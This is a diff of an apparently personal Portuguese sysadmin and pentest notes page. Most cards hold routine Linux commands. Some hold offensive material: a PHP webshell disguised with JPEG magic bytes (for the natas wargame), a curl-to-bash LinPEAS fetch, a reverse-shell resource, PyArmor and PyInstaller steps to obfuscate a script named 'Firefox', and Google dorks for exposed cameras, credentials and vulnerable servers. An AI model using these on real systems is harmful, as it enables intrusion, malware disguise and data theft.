@@ -88,7 +88,7 @@
 
 
     <!-- notes -->
-      <section id="notes" class="container">
+    <section id="notes" class="container">
         <h2>Implementações</h2>
         <br>
         <div class="note-list3" id="notes-title3">
@@ -117,308 +117,375 @@
                 <h3>OpenCTI</h3>
                 <button onclick="showModalIncluse('opencti')">Ver Detalhes</button>
             </div>
-        </section>
-            <br>
+    </section>
+    <br>
 
-            <!-- notes -->
-        <section id="notes" class="container">
-                <h2>Hardening</h2>
+    <!-- notes -->
+    <section id="notes" class="container">
+        <h2>Hardening</h2>
+        <br>
+        <div class="note-list" id="notes-title">
+            <!-- note 1 -->
+            <div class="note-card">
+                <h3>SSH</h3>
+                <button onclick="showModalPlaybook('ssh')">Ver Detalhes</button>
+            </div>
+
+
+            <!-- note 2 -->
+            <div class="note-card">
+                <h3>Linux</h3>
+                <button onclick="showModalPlaybook('linux')">Ver Detalhes</button>
+            </div>
+
+
+            <!-- note 4 -->
+            <div class="note-card">
+                <h3>Firewall</h3>
+                <button onclick="showModalPlaybook('firewalld')">Ver Detalhes</button>
+            </div>
+
+    </section>
+    <br>
+
+    <!-- notes -->
+    z<section id="commands" class="container">
+        <h2>Comandos & Anotações</h2>
+        <br>
+        <div class="note-list2" id="notes-title">
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Comandos Úteis</h1>
+                <p><strong>Consultar comandos - </strong><a href="https://explainshell.com/"
+                        target="_blank">https://explainshell.com/</a></p>
+                <p><strong>Remover KeySensitive - </strong>echo set completion-ignore-case on | sudo tee -a
+                    /etc/inputrc
+                </p>
+                <p><strong>Uso de disco - </strong>df -h</p>
+                <p><strong>Uso de memória - </strong>free -m</p>
+                <p><strong>Uso de CPU - </strong>top</p>
+                <p><strong>Verificar processos - </strong>ps axjf</p>
+                <p><strong>Verificar versão do Kernel - </strong>uname -a</p>
+                <p><strong>Verificar versão do SO - </strong>cat /etc/*-release</p>
+                <p><strong>Listar comandos disponiveis - </strong>apropos ''</p>
+                <p><strong>Listar todos os comandos disponíveis - </strong>compgen -c</p>
+                <p><strong>Listar todos os aliases disponíveis - </strong>compgen -a</p>
+                <p><strong>Listar "arquivos" abertos - </strong>lsof</p>
+                <p><strong>Rastrear Chamadas do Sistema - </strong>strace</p>
+                <p><strong>Rastrear Chamadas de Bibliotecas - </strong>ltrace</p>
+                <p><strong>Listar dispositivos USB por ID - </strong>ls -l /dev/disk/by-id/</p>
+                <p><strong>Informações detalhadas de USB - </strong>sudo lsusb -v -s 001:005</p>
+                <p><strong>Informações detalhadas por Blocos - </strong>udevadm info --query=all --name=/dev/sda
+                    | grep
+                    SERIAL</p>
+            </div>
+
+            <div class="note-card2">
+                <h1>Sites Úteis</h1>
+                <ul>
+                   <li><a href="https://haveibeenpwned.com/" target="_blank">Have I Been Pwned</a> - Verifica se seus dados foram comprometidos em vazamentos.</li>
+                </ul>
+            </div>
+
+            <div class="note-card2"></div>
+                <h1>Ferramentas de CTI</h1>
+                <ul>
+                    <li><a href="https://dev.urlquery.net" target="_blank">URLQuery</a> - Análise de URLs.</li>
+                    <li><a href="https://urlscan.io" target="_blank">URLScan</a> - Escaneamento de URLs.</li>
+                    <li><a href="https://www.virustotal.com" target="_blank">VirusTotal</a> - Análise de arquivos e URLs.</li>
+                    <li><a href="https://www.urlvoid.com/" target="_blank">URLVoid</a> - Verificação de reputação de URLs.</li>
+                    <li><a href="https://sitecheck.sucuri.net/" target="_blank">Sucuri SiteCheck</a> - Verificação de segurança de sites.</li>
+                </ul>
+            </div>
+
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Criação de usuário</h1>
+                <p><strong>Adicionar usuário com restrições:</strong></p>
+                <p>sudo useradd --badname -m -s /bin/rbash usuario</p>
+                <p>sudo passwd usuario</p>
                 <br>
-                <div class="note-list" id="notes-title">
-                    <!-- note 1 -->
-                    <div class="note-card">
-                        <h3>SSH</h3>
-                        <button onclick="showModalPlaybook('ssh')">Ver Detalhes</button>
-                    </div>
-
-
-                    <!-- note 2 -->
-                    <div class="note-card">
-                        <h3>Linux</h3>
-                        <button onclick="showModalPlaybook('linux')">Ver Detalhes</button>
-                    </div>
-
-
-                    <!-- note 4 -->
-                    <div class="note-card">
-                        <h3>Firewall</h3>
-                        <button onclick="showModalPlaybook('firewalld')">Ver Detalhes</button>
-                    </div>
-
-        </section>
-            <br>
-
-            <!-- notes -->
-        z<section id="commands" class="container">
-                <h2>Comandos & Anotações</h2>
+                <p><strong>Para alterar o SHELL:</strong></p>
+                <p>sudo usermod --shell /bin/bash usuario</p>
                 <br>
-                <div class="note-list2" id="notes-title">
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Comandos Úteis</h1>
-                       
-                        <p><strong>Remover KeySensitive - </strong>echo set completion-ignore-case on | sudo tee -a
-                            /etc/inputrc
-                        </p>
-                        <p><strong>Uso de disco - </strong>df -h</p>
-                        <p><strong>Uso de memória - </strong>free -m</p>
-                        <p><strong>Uso de CPU - </strong>top</p>
-                        <p><strong>Verificar processos - </strong>ps axjf</p>
-                        <p><strong>Verificar versão do Kernel - </strong>uname -a</p>
-                        <p><strong>Verificar versão do SO - </strong>cat /etc/*-release</p>
-                        <p><strong>Listar comandos disponiveis - </strong>apropos ''</p>
-                        <p><strong>Listar todos os comandos disponíveis - </strong>compgen -c</p>
-                        <p><strong>Listar todos os aliases disponíveis - </strong>compgen -a</p>
-                        <p><strong>Listar "arquivos" abertos - </strong>lsof</p>
-                        <p><strong>Rastrear Chamadas do Sistema - </strong>strace</p>
-                        <p><strong>Rastrear Chamadas de Bibliotecas - </strong>ltrace</p>
-                        <p><strong>Listar dispositivos USB por ID - </strong>ls -l /dev/disk/by-id/</p>
-                        <p><strong>Informações detalhadas de USB - </strong>sudo lsusb -v -s 001:005</p>
-                        <p><strong>Informações detalhadas por Blocos - </strong>udevadm info --query=all --name=/dev/sda
-                            | grep
-                            SERIAL</p>
-                    </div>
-
-                    <div class="note-card2">
-                        <h1>Sites Úteis</h1>
-                        <p><strong>Dashboards para CTI:</strong> <a
-                                href="https://www.google.com/search?q=intext:start.me;threat"
-                                target="_blank">intext:start.me;threat</a></p>
-                        <p><strong>Dashboards para OSINT:</strong> <a
-                                href="https://www.google.com/search?q=intext:start.me;osint"
-                                target="_blank">intext:start.me;osint</a></p>
-                        <p><strong>ExplainShell:</strong> <a href="https://explainshell.com/" target="_blank">Explica
-                                comandos do shell.</a></p>
-                        <p><strong>Regex101:</strong><a href="https://regex101.com/" target="_blank"> Teste e aprenda
-                                expressões regulares. </a></p>
-                        <p><strong>GTmetrix:</strong><a href="https://gtmetrix.com/" target="_blank"> Análise de
-                                desempenho de sites. </a></p>
-                    </div>
-
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Criação de usuário</h1>
-                        <p><strong>Adicionar usuário com restrições:</strong></p>
-                        <p>sudo useradd --badname -m -s /bin/rbash usuario</p>
-                        <p>sudo passwd usuario</p>
-                        <br>
-                        <p><strong>Para alterar o SHELL:</strong></p>
-                        <p>sudo usermod --shell /bin/bash usuario</p>
-                        <br>
-                        <p><strong>Criar usuário sem Home</strong></p>
-                        <p>sudo adduser --system --no-create-home --group nome_do_usuario</p>
-                    </div>
+                <p><strong>Criar usuário sem Home</strong></p>
+                <p>sudo adduser --system --no-create-home --group nome_do_usuario</p>
+            </div>
 
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Python3</h1>
-                        <p><strong>Remover restrição do PIP INSTALL - </strong>sudo rm
-                            /usr/lib/python3.11/EXTERNALLY-MANAGED
-                        </p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Python3</h1>
+                <p><strong>Remover restrição do PIP INSTALL - </strong>sudo rm
+                    /usr/lib/python3.11/EXTERNALLY-MANAGED
+                </p>
+            </div>
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Python Env 2.7 e 3.x</h1>
-                        <p>mkdir novo_projeto && cd novo_projeto</p>
-                        <p><strong>Python2.7 - </strong>python2.7 -m virtualenv venv</p>
-                        <p><strong>Python3.x - </strong>python3 -m venv venv</p>
-                        <p><strong>Habilitar o Env - </strong>source venv/bin/activate</p>
-                        <p><strong>Desabilitar o Env - </strong>deactivate</p>
-                        <p><strong>Instalar Libs - </strong>pip install -r requirements.txt</p>
-                        <p><strong>Exportar Libs - </strong>pip freeze > requirements.txt</p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Python Env 2.7 e 3.x</h1>
+                <p>mkdir novo_projeto && cd novo_projeto</p>
+                <p><strong>Python2.7 - </strong>python2.7 -m virtualenv venv</p>
+                <p><strong>Python3.x - </strong>python3 -m venv venv</p>
+                <p><strong>Habilitar o Env - </strong>source venv/bin/activate</p>
+                <p><strong>Desabilitar o Env - </strong>deactivate</p>
+                <p><strong>Instalar Libs - </strong>pip install -r requirements.txt</p>
+                <p><strong>Exportar Libs - </strong>pip freeze > requirements.txt</p>
+            </div>
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Criar e Restaurar Backups</h1>
-                        <p><strong>BKP de diretório - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C /home
-                        </p>
-                        <p><strong>Restaurar BKP - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C
-                            /home/seu_usuario</p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Criar e Restaurar Backups</h1>
+                <p><strong>BKP de diretório - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C /home
+                </p>
+                <p><strong>Restaurar BKP - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C
+                    /home/seu_usuario</p>
+            </div>
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Configuração de Rede</h1>
-                        <p><strong>Verificar Interfaces/IPs - </strong>ip -br a</p>
-                        <p><strong>"Subir" interface de rede - </strong>sudo ip link set eth0 up</p>
-                        <p><strong>"Derrubar" interface de rede - </strong>sudo ip link set eth0 down</p>
-                        <p><strong>Renomear interface de rede - </strong>sudo ip link set eth0 name eth1</p>
-                        <p><strong>Verificar endereço IP da interface - </strong>ip addr show eth0</p>
-                        <p><strong>Configurar endereço IP estático - </strong>sudo ip addr add 192.168.1.100/24 dev eth0
-                        </p>
-                        <p><strong>Remover endereço IP - </strong>sudo ip addr del 192.168.1.100/24 dev eth0</p>
-                        <p><strong>Adicionar rota padrão - </strong>sudo ip route add default via 192.168.1.1</p>
-                        <p><strong>Verificar tabela de roteamento - </strong>ip route show</p>
-                        <p><strong>Testar conectividade (ping) - </strong>ping google.com</p>
-                        <p><strong>Liberar e renovar IP (DHCP) - </strong>sudo dhclient -r eth0 && sudo dhclient eth0
-                        </p>
-                        <p><strong>Verificar status da interface - </strong>ip link show eth0</p>
-                        <p><strong>Habilitar/Desabilitar IPv6 - </strong>sudo sysctl -w
-                            net.ipv6.conf.eth0.disable_ipv6=1</p>
-                        <p><strong>Verificar tráfego de rede - </strong>sudo iftop -i eth0</p>
-                        <p><strong>Configurar DNS temporário - </strong>sudo echo "nameserver 8.8.8.8" >
-                            /etc/resolv.conf</p>
-                        <p><strong>Verificar resolução DNS - </strong>nslookup google.com</p>
-                        <p><strong>Verificar velocidade da interface - </strong>ethtool eth0</p>
-                        <p><strong>Configurar MTU da interface - </strong>sudo ip link set eth0 mtu 1500</p>
-                        <p><strong>Monitorar tráfego de rede em tempo real - </strong>sudo tcpdump -i eth0</p>
-                        <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
-                        <br>
-                        <p><strong>Descoberta de Rede (ARP) - - </strong>sudo netdiscover</p>
-                        <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp
-
-
-                    </div>
-
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Recriar GRUB</h1>
-                        <p><strong>GRUB:</strong></p>
-                        <p>grub> set root=(hd0,1) &lt;&lt;- sintaxe da versão Grub2</p>
-                        <p>grub> linux /boot/vmlinuz-xxxx root=/dev/sda1 ro quiet</p>
-                        <p>grub> initrd /boot/initrd.img</p>
-                        <p>grub> boot</p>
-                        <p><strong>CFG:</strong></p>
-                        <p>sudo nano /etc/default/grub</p>
-                        <p><strong>Manual em:</strong> <a href="https://www.gnu.org/software/grub"
-                                target="_blank">www.gnu.org/software/grub</a></p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Configuração de Rede</h1>
+                <p><strong>Verificar Interfaces/IPs - </strong>ip -br a</p>
+                <p><strong>"Subir" interface de rede - </strong>sudo ip link set eth0 up</p>
+                <p><strong>"Derrubar" interface de rede - </strong>sudo ip link set eth0 down</p>
+                <p><strong>Renomear interface de rede - </strong>sudo ip link set eth0 name eth1</p>
+                <p><strong>Verificar endereço IP da interface - </strong>ip addr show eth0</p>
+                <p><strong>Configurar endereço IP estático - </strong>sudo ip addr add 192.168.1.100/24 dev eth0
+                </p>
+                <p><strong>Remover endereço IP - </strong>sudo ip addr del 192.168.1.100/24 dev eth0</p>
+                <p><strong>Adicionar rota padrão - </strong>sudo ip route add default via 192.168.1.1</p>
+                <p><strong>Verificar tabela de roteamento - </strong>ip route show</p>
+                <p><strong>Testar conectividade (ping) - </strong>ping google.com</p>
+                <p><strong>Liberar e renovar IP (DHCP) - </strong>sudo dhclient -r eth0 && sudo dhclient eth0
+                </p>
+                <p><strong>Verificar status da interface - </strong>ip link show eth0</p>
+                <p><strong>Habilitar/Desabilitar IPv6 - </strong>sudo sysctl -w
+                    net.ipv6.conf.eth0.disable_ipv6=1</p>
+                <p><strong>Verificar tráfego de rede - </strong>sudo iftop -i eth0</p>
+                <p><strong>Configurar DNS temporário - </strong>sudo echo "nameserver 8.8.8.8" >
+                    /etc/resolv.conf</p>
+                <p><strong>Verificar resolução DNS - </strong>nslookup google.com</p>
+                <p><strong>Verificar velocidade da interface - </strong>ethtool eth0</p>
+                <p><strong>Configurar MTU da interface - </strong>sudo ip link set eth0 mtu 1500</p>
+                <p><strong>Monitorar tráfego de rede em tempo real - </strong>sudo tcpdump -i eth0</p>
+                <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
+                <br>
+                <p><strong>Descoberta de Rede (ARP) - - </strong>sudo netdiscover</p>
+                <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp
 
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Manipulação de Serviços</h1>
-                        <p><strong>Listar Serviços - </strong>sudo systemctl list-unit-files</p>
-                        <p><strong>Habilitar Serviço - </strong>sudo systemctl enable (nome do serviço)</p>
-                        <p><strong>Desabilitar Serviço - </strong>sudo systemctl disable (nome do serviço)</p>
-                        <p><strong>Status do Serviço - </strong>sudo systemctl status (nome do serviço)</p>
-                        <p><strong>Iniciar Serviço - </strong>sudo systemctl start (nome do serviço)</p>
-                        <p><strong>Parar Serviço - </strong>sudo systemctl stop (nome do serviço)</p>
-                        <p><strong>Reiniciar Serviço - </strong>sudo systemctl restart (nome do serviço)</p>
-                        <p><strong>Recarregar Serviços - </strong>sudo systemctl daemon-reload</p>
-                        <p><strong>Diretórios comuns dos Serviços - </strong>/lib, /etc e /run : /systemd/system/</p>
-                    </div>
+            </div>
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Recriar GRUB</h1>
+                <p><strong>GRUB:</strong></p>
+                <p>grub> set root=(hd0,1) &lt;&lt;- sintaxe da versão Grub2</p>
+                <p>grub> linux /boot/vmlinuz-xxxx root=/dev/sda1 ro quiet</p>
+                <p>grub> initrd /boot/initrd.img</p>
+                <p>grub> boot</p>
+                <p><strong>CFG:</strong></p>
+                <p>sudo nano /etc/default/grub</p>
+                <p><strong>Manual em:</strong> <a href="https://www.gnu.org/software/grub"
+                        target="_blank">www.gnu.org/software/grub</a></p>
+            </div>
+
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Manipulação de Serviços</h1>
+                <p><strong>Listar Serviços - </strong>sudo systemctl list-unit-files</p>
+                <p><strong>Habilitar Serviço - </strong>sudo systemctl enable (nome do serviço)</p>
+                <p><strong>Desabilitar Serviço - </strong>sudo systemctl disable (nome do serviço)</p>
+                <p><strong>Status do Serviço - </strong>sudo systemctl status (nome do serviço)</p>
+                <p><strong>Iniciar Serviço - </strong>sudo systemctl start (nome do serviço)</p>
+                <p><strong>Parar Serviço - </strong>sudo systemctl stop (nome do serviço)</p>
+                <p><strong>Reiniciar Serviço - </strong>sudo systemctl restart (nome do serviço)</p>
+                <p><strong>Recarregar Serviços - </strong>sudo systemctl daemon-reload</p>
+                <p><strong>Diretórios comuns dos Serviços - </strong>/lib, /etc e /run : /systemd/system/</p>
+            </div>
 
 
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Firewall Commands</h1>
-                        <p><strong>Redirecionar saída para destino específico:</strong></p>
-                        <p>sudo iptables -t nat -A OUTPUT -o tun0 -j DNAT --to-destination 10.13.5.224</p>
-                        <p><strong>Alterar a interface de uma zona:</strong></p>
-                        <p>firewall-cmd --zone={selected_zone} --change-interface={seleciona_interface} --permanent</p>
-                        <p><strong>Adicionar interfaces a uma zona:</strong></p>
-                        <p>firewall-cmd --zone={selected_zone} --permanent --add-interface={seleciona_interface}</p>
-                        <p><strong>Remover interfaces de uma zona:</strong></p>
-                        <p>firewall-cmd --zone={selected_zone} --permanent --remove-interface={interface_to_remove}</p>
-                        <p><strong>Adicionar serviços a uma zona:</strong></p>
-                        <p>firewall-cmd --add-service={service_choice} --permanent --zone={selected_zone}</p>
-                        <p><strong>Remover serviços de uma zona:</strong></p>
-                        <p>firewall-cmd --remove-service={service_choice} --permanent --zone={selected_zone}</p>
-                        <p><strong>Adicionar portas a uma zona:</strong></p>
-                        <p>firewall-cmd --add-port={port}/tcp --permanent --zone={selected_zone}</p>
-                        <p>firewall-cmd --add-port={port}/udp --permanent --zone={selected_zone}</p>
-                        <p><strong>Remover portas de uma zona:</strong></p>
-                        <p>firewall-cmd --remove-port={port}/tcp --permanent --zone={selected_zone}</p>
-                        <p>firewall-cmd --remove-port={port}/udp --permanent --zone={selected_zone}</p>
-                        <p><strong>Bloquear IP:</strong></p>
-                        <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
-                            address={blocked_ip} drop'</p>
-                        <p><strong>Bloquear range de IP por máscara (não testado):</strong></p>
-                        <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
-                            address={ip_mask} drop'</p>
-                        <p><strong>Alterar o target:</strong></p>
-                        <p>firewall-cmd --zone=selected_zone --set-target=sit-target</p>
-                        <p><strong>Aplicar configurações:</strong></p>
-                        <p>firewall-cmd --reload</p>
-                        <br>
-                        <h1>Redirecionar Portas com Firewalld</h1>
-                        <p><strong>Adicionar redirecionamento de porta:</strong></p>
-                        <p>firewall-cmd --add-forward-port=port=80:proto=tcp:toport=3000</p>
-                        <p>firewall-cmd --runtime-to-permanent</p>
-                        <p><strong>Remover redirecionamento de porta:</strong></p>
-                        <p>firewall-cmd --remove-forward-port=port=80:proto=tcp:toport=3000:toaddr=</p>
-                        <p>firewall-cmd --runtime-to-permanent</p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Firewall Commands</h1>
+                <p><strong>Redirecionar saída para destino específico:</strong></p>
+                <p>sudo iptables -t nat -A OUTPUT -o tun0 -j DNAT --to-destination 10.13.5.224</p>
+                <p><strong>Alterar a interface de uma zona:</strong></p>
+                <p>firewall-cmd --zone={selected_zone} --change-interface={seleciona_interface} --permanent</p>
+                <p><strong>Adicionar interfaces a uma zona:</strong></p>
+                <p>firewall-cmd --zone={selected_zone} --permanent --add-interface={seleciona_interface}</p>
+                <p><strong>Remover interfaces de uma zona:</strong></p>
+                <p>firewall-cmd --zone={selected_zone} --permanent --remove-interface={interface_to_remove}</p>
+                <p><strong>Adicionar serviços a uma zona:</strong></p>
+                <p>firewall-cmd --add-service={service_choice} --permanent --zone={selected_zone}</p>
+                <p><strong>Remover serviços de uma zona:</strong></p>
+                <p>firewall-cmd --remove-service={service_choice} --permanent --zone={selected_zone}</p>
+                <p><strong>Adicionar portas a uma zona:</strong></p>
+                <p>firewall-cmd --add-port={port}/tcp --permanent --zone={selected_zone}</p>
+                <p>firewall-cmd --add-port={port}/udp --permanent --zone={selected_zone}</p>
+                <p><strong>Remover portas de uma zona:</strong></p>
+                <p>firewall-cmd --remove-port={port}/tcp --permanent --zone={selected_zone}</p>
+                <p>firewall-cmd --remove-port={port}/udp --permanent --zone={selected_zone}</p>
+                <p><strong>Bloquear IP:</strong></p>
+                <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
+                    address={blocked_ip} drop'</p>
+                <p><strong>Bloquear range de IP por máscara (não testado):</strong></p>
+                <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
+                    address={ip_mask} drop'</p>
+                <p><strong>Alterar o target:</strong></p>
+                <p>firewall-cmd --zone=selected_zone --set-target=sit-target</p>
+                <p><strong>Aplicar configurações:</strong></p>
+                <p>firewall-cmd --reload</p>
+                <br>
+                <h1>Redirecionar Portas com Firewalld</h1>
+                <p><strong>Adicionar redirecionamento de porta:</strong></p>
+                <p>firewall-cmd --add-forward-port=port=80:proto=tcp:toport=3000</p>
+                <p>firewall-cmd --runtime-to-permanent</p>
+                <p><strong>Remover redirecionamento de porta:</strong></p>
+                <p>firewall-cmd --remove-forward-port=port=80:proto=tcp:toport=3000:toaddr=</p>
+                <p>firewall-cmd --runtime-to-permanent</p>
+            </div>
 
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Baixar Sites</h1>
-                        <p><strong>Com WGET - </strong>wget --mirror --convert-links --adjust-extension
-                            --page-requisites
-                            https://URL</p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Baixar Sites</h1>
+                <p><strong>Com WGET - </strong>wget --mirror --convert-links --adjust-extension
+                    --page-requisites
+                    https://URL</p>
+            </div>
 
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Dados de Conexão</h1>
-                        <p><strong>IP Externo - </strong>curl ifconfig.me</p>
-                    </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Dados de Conexão</h1>
+                <p><strong>IP Externo - </strong>curl ifconfig.me</p>
+            </div>
 
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>PHP</h1>
-                        <p><strong>Camuflar WebShellPHP em Imagem:</strong></p>
-                        <p>echo -e "\xFF\xD8\xFF\xE0" > image.php</p>
-                        <p>echo -n '&lt;?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?&gt;' >>
-                            image.php
-                        </p>
-                        <p><strong>Verificar o arquivo</strong></p>
-                        <p>file image.php</p>
-                        <p><strong>Deve retornar o seguinte:</strong></p>
-                        <p>image.php: JPEG image data</p>
-                    </div>
-
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Enumeração</h1>
-                        <p><strong>LinPeas - </strong>curl -L
-                            https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
-                    </div>
-
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Estabilizar Conexão</h1>
-                        <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
-                                target="_blank">https://www.revshells.com/</a></p>
-                    </div>
-
-                    <!-- note 1 -->
-                    <div class="note-card2">
-                        <h1>Maware</h1>
-                        <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
-                        <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
-                        <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
-                            gunkey.py</p>
-                    </div>
-                </div>
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>PHP</h1>
+                <p><strong>Camuflar WebShellPHP em Imagem:</strong></p>
+                <p>echo -e "\xFF\xD8\xFF\xE0" > image.php</p>
+                <p>echo -n '&lt;?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?&gt;' >>
+                    image.php
+                </p>
+                <p><strong>Verificar o arquivo</strong></p>
+                <p>file image.php</p>
+                <p><strong>Deve retornar o seguinte:</strong></p>
+                <p>image.php: JPEG image data</p>
+            </div>
 
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>Permissões com Find</h1>
-                    <p>find / -type f \( -name usuario1 -o -name usuario2 \) -exec ls -ladb {} \; 2>/dev/null</p>
-                    <p>find / -name root.txt -exec ls -lda {} \; 2>/dev/null</p>
-                    <p>find / -user root -perm -4000 -exec ls -ladb {} \; 2>/dev/null</p>
-                    <p>find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null</p>
-                    <p>find / -type f -perm -u=s -user des -ls 2>/dev/null</p>
-                    <p>find / -type f -name "*.bak" 2>/dev/null</p>
-                    <p>find / -perm -u=s -type f 2>/dev/null</p>
-                </div>
 
 
-                <!-- note 1 -->
-                <div class="note-card2">
-                    <h1>CRON</h1>
-                    <p><strong>O arquivo crontab tem cinco campos de tempo seguidos pelo comando a ser
-                            executado:</strong></p>
-                    <pre style="color: white;">
+        <div class="note-card2">
+            <h1>Google Dorks</h1>
+            <ul>
+                <li><strong>Finding exposed directories:</strong> <code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) -inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></li>
+                <li><strong>Discovering open webcams:</strong> <code>inurl:"viewerframe?mode=motion"</code></li>
+                <li><strong>Finding email lists:</strong> <code>filetype:txt @gmail.com OR @yahoo.com OR @hotmail.com OR @aol.com</code></li>
+                <li><strong>Uncovering vulnerable web servers:</strong> <code>intitle:"Welcome to Windows 2000 Internet Services"</code></li>
+                <li><strong>Discovering exposed CCTV cameras:</strong> <code>inurl:ViewerFrame?Mode=Motion</code></li>
+                <li><strong>Finding SQL injection vulnerabilities:</strong> <code>inurl:index.php?id=</code></li>
+                <li><strong>Uncovering sensitive information in files:</strong> <code>intitle:"Index of" password.txt</code></li>
+                <li><strong>Discovering login pages:</strong> <code>inurl:admin/login</code></li>
+                <li><strong>Finding exposed databases:</strong> <code>intext:"phpMyAdmin" "running on" inurl:"main.php"</code></li>
+                <li><strong>Discovering vulnerable WordPress sites:</strong> <code>inurl:/wp-content/plugins/revslider/</code></li>
+                <li><strong>Finding open FTP servers:</strong> <code>intitle:"index of" inurl:ftp</code></li>
+                <li><strong>Discovering exposed configuration files:</strong> <code>intitle:"index of" config.yml</code></li>
+                <li><strong>Finding open Git repositories:</strong> <code>intitle:index of .git</code></li>
+                <li><strong>Discovering vulnerable Joomla installations:</strong> <code>inurl:/index.php?option=com_joomla</code></li>
+                <li><strong>Finding sensitive files:</strong> <code>intitle:"index of" password OR passcode OR passphrase OR keyfile</code></li>
+                <li><strong>Discovering exposed MongoDB instances:</strong> <code>intitle:"mongodb status" intext:"topologyVersion"</code></li>
+                <li><strong>Finding open network devices:</strong> <code>intitle:"open network devices"</code></li>
+                <li><strong>Discovering exposed subdomains:</strong> <code>site:\*.example.com -www</code></li>
+                <li><strong>Finding vulnerable Apache Tomcat installations:</strong> <code>intitle:"Apache Tomcat" intext:"If you're seeing this, you've successfully installed Tomcat"</code></li>
+                <li><strong>Discovering exposed GitLab repositories:</strong> <code>intitle:"GitLab"</code></li>
+                <li><strong>Finding exposed server directories:</strong> <code>intitle:"index of" /admin</code></li>
+                <li><strong>Discovering sensitive Google Drive files:</strong> <code>site:drive.google.com confidential</code></li>
+                <li><strong>Finding exposed Jenkins instances:</strong> <code>intitle:"Dashboard [Jenkins]"</code></li>
+                <li><strong>Discovering exposed AWS S3 buckets:</strong> <code>site:s3.amazonaws.com</code></li>
+                <li><strong>Finding vulnerable Magento installations:</strong> <code>inurl:/index.php/admin</code></li>
+                <li><strong>Discovering exposed log files:</strong> <code>intitle:"index of" error.log</code></li>
+                <li><strong>Finding open Elasticsearch instances:</strong> <code>intitle:"Kibana" intext:"Welcome to Elastic"</code></li>
+                <li><strong>Discovering exposed API keys:</strong> <code>filetype:env intext:API_KEY</code></li>
+                <li><strong>Finding exposed phpMyAdmin installations:</strong> <code>inurl:"phpmyadmin/index.php"</code></li>
+                <li><strong>Discovering vulnerable OpenCart installations:</strong> <code>inurl:/admin/config.php</code></li>
+                <li><strong>Finding exposed sensitive documents:</strong> <code>filetype:pdf "Confidential"</code></li>
+                <li><strong>Discovering exposed network devices:</strong> <code>intitle:"Device name" inurl:home.htm</code></li>
+                <li><strong>Finding open RDP (Remote Desktop Protocol) servers:</strong> <code>intitle:"Remote Desktop Web Connection"</code></li>
+                <li><strong>Discovering exposed Firebase databases:</strong> <code>intitle:"Firebase Console - Projects"</code></li>
+                <li><strong>Finding vulnerable Drupal installations:</strong> <code>inurl:"/user/login" "Powered by Drupal"</code></li>
+            </ul>
+        </div>
+
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Enumeração</h1>
+                <p><strong>LinPeas - </strong>curl -L
+                    https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
+            </div>
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Estabilizar Conexão</h1>
+                <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
+                        target="_blank">https://www.revshells.com/</a></p>
+            </div>
+
+            <!-- note 1 -->
+            <div class="note-card2">
+                <h1>Maware</h1>
+                <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
+                <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
